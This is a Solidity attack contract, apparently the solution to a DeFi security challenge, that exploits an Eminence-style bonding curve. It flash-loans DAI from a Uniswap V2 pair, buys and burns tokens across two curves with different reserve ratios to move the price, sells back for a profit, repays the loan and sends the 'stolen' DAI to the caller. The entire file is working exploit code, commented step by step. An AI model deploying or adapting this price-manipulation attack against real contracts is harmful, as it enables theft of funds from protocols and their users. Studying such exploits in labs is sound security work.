// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {Token} from "src/other/Token.sol";
import {IEminenceCurrency} from "src/bonding-curve/EminenceInterfaces.sol";

contract BondingCurveAttack {
    IUniswapV2Pair uniPair; // DAI-USDC trading pair
    Token dai;
    IEminenceCurrency eminenceCurrencyBase;
    IEminenceCurrency eminenceCurrency;

    constructor(
        Token _dai,
        IUniswapV2Pair _uniPair,
        IEminenceCurrency _eminenceCurrencyBase,
        IEminenceCurrency _eminenceCurrency
    ) {
        uniPair = _uniPair;
        dai = _dai;
        eminenceCurrencyBase = _eminenceCurrencyBase;
        eminenceCurrency = _eminenceCurrency;
    }

    function attack() external {
        // flash loan all of DAI from UniswapV2Pair
        uniPair.swap({amount0Out: 0, amount1Out: 999_999e18, to: address(this), data: "flash"});

        // get DAI for the attacker
        uint256 daiToAttacker = dai.balanceOf(address(this));
        console.log("DAI attacker ", daiToAttacker);

        // transfer the DAI stolen to the attacker
        dai.transfer({to: msg.sender, amount: daiToAttacker});
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // get DAI balance flashed
        uint256 daiAmount = dai.balanceOf(address(this));
        console.log("DAI flashed  ", daiAmount);

        // buy EMN with DAI
        // we get minted EMN, the price doesn't change much because reserveRatio = 99%
        dai.approve({spender: address(eminenceCurrencyBase), amount: daiAmount});
        eminenceCurrencyBase.buy({_amount: daiAmount, _min: 0});

        // get EMN balance
        uint256 emnAmount = eminenceCurrencyBase.balanceOf(address(this));
        console.log("EMN bought   ", emnAmount);

        // buy TOKEN with half of EMN (burns EMN)
        // we burn EMN and the price should change a lot because reserveRatio = 50%
        eminenceCurrency.buy({_amount: emnAmount / 2, _min: 0});

        // sell rest of EMN for DAI
        eminenceCurrencyBase.sell({_amount: emnAmount / 2, _min: 0});

        // get DAI stolen
        daiAmount = dai.balanceOf(address(this));
        console.log("DAI stolen   ", daiAmount);

        // get the TOKEN amount
        uint256 tokenAmount = eminenceCurrency.balanceOf(address(this));
        console.log("TOKEN bought ", tokenAmount);

        // sell TOKEN for EMN
        eminenceCurrency.sell({_amount: tokenAmount, _min: 0});

        // get remaining EMN
        emnAmount = eminenceCurrencyBase.balanceOf(address(this));
        console.log("EMN remaining", emnAmount);

        // sell remaining EMN for DAI
        eminenceCurrencyBase.sell({_amount: emnAmount, _min: 0});

        // get the final DAI amount
        daiAmount = dai.balanceOf(address(this));
        console.log("DAI final    ", daiAmount);

        // repay flash loan
        dai.transfer({to: address(uniPair), amount: amount1 * 103 / 100});
    }
}
